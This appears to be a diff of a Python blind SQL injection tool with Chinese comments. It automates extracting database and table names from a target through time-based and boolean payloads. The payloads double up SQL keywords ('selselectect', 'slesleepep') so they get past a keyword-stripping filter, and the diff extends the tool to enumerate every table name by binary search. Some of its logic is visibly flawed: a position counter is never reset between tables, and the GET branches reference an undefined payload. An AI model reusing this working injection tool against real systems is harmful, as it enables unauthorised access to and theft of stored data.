@@ -33,7 +33,7 @@ num_table="admin' anandd (selselectect count(TABLE_NAME) frfromom infoorrmation_
 len_table="admin' anandd (selselectect length(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() limit {},1)={}#"
 
 #爆破表名的ascii码值的payload
-table_size="admin' aandnd iiff(asasciicii(subsubstrstr((seleselectct table_name frfromom infoorrmation_schema.tables whewherere table_schema = database()),{},1))={},slesleepep(3),1)#"
+table_size="admin' aandnd iiff(asasciicii(subsubstrstr((seleselectct table_name frfromom infoorrmation_schema.tables whewherere table_schema = database() limit {},1),{},1))={},slesleepep(3),1)#"
 
 #get请求
 def get(url,payload):
@@ -117,6 +117,7 @@ def fuzz_D_size(url,len,method,data):
             print(chr(mid),end='')
             #payload = payload.replace(str(time),"len")
             time += 1
+        print("\n")
 
 #爆破表的数量
 def fuzz_T_num(url,method,data):
@@ -125,7 +126,7 @@ def fuzz_T_num(url,method,data):
     if method =='get':
         result = get(url,payload)
     elif method =='post':
-        #猜数据库数量
+        #猜表数量
         for num in range(1,20):
             payload=num_table.format(num)
             result = post(url,payload,data)
@@ -141,55 +142,66 @@ def fuzz_T_len(url,method,data,num):
     if method =='get':
         result = get(url,payload)
     elif method =='post':
-        #猜数据库长度
-        for num in range(1,num+1):
+        #猜表长度
+        Length={}
+        for n in range(1,num+1):
             for len in range(1,20):
-                payload=num_table.format((num-1),len)
+                payload=len_table.format((n-1),len)
                 result = post(url,payload,data)
                 if message not in result:
-                    print("第{}个表的数量为：".format(num)+str(len))
-                    return len
-
+                    #print("第{}个表的长度为：".format(n)+str(len))
+                    Length[n-1]=len
+                    break
+        return Length
             
-#爆破表的ascii码值
-def fuzz_T_size(url,len,method,data):
+#爆破表名
+def fuzz_T_size(url,len_T,method,data,num):
     if data==None:
         data =''
     time = 1
     if method =='get':
         result = get(url,payload)
     elif method =='post':
-        print("表名为:",end='')
-        while time <= len:
-            low = 32
-            high = 128
-            mid = (high + low) // 2
-            #payload = payload.replace("len",str(time))
-            while low < high:
-                #payload = payload.replace("size",str(mid))
-                payload = payload_size.format(time,mid)
-                result = post(url,payload,data)
-                if message in result:
-                    high = mid
-                else:
-                    low += 1
-                #payload = payload.replace(str(mid),"size")
-                mid = (low+high)//2
-            print(chr(mid),end='')
-            #payload = payload.replace(str(time),"len")
-            time += 1
+        for n in range(1,num+1):
+            print("第{}表名为:".format(n),end='')
+            while time <= len_T[n-1]:
+                low = 32
+                high = 128
+                mid = (high + low) // 2
+                #payload = payload.replace("len",str(time))
+                while low < high:
+                    #payload = payload.replace("size",str(mid))
+                    payload = table_size.format((n-1),time,mid)
+                    result = post(url,payload,data)
+                    if message in result:
+                        high = mid
+                    else:
+                        low += 1
+                    #payload = payload.replace(str(mid),"size")
+                    mid = (low+high)//2
+                print(chr(mid),end='')
+                #payload = payload.replace(str(time),"len")
+                time += 1
+            print("\n")
+
+
         
 
 def scan(url,method,data):
     ##爆破数据库长度
-    #len = fuzz_D_len(url,method,data)
+    len = fuzz_D_len(url,method,data)
     ##爆破数据库名
-    #fuzz_D_size(url,len,method,data)
+    fuzz_D_size(url,len,method,data)
     #爆破表的数量
     num = fuzz_T_num(url,method,data)
     #爆破表的长度
-    fuzz_T_len(url,method,data,num)
-            
+    len_T={}
+    len_T = fuzz_T_len(url,method,data,num)
+    for i in len_T:
+        print("第%i个表的长度为：" % (i+1) + str(len_T[i]))
+    #爆破表的值
+    fuzz_T_size(url,len_T,method,data,num)
+
             #判断是否存在注入
             #check_sql(url,method,data,payload)
             #搜索数据
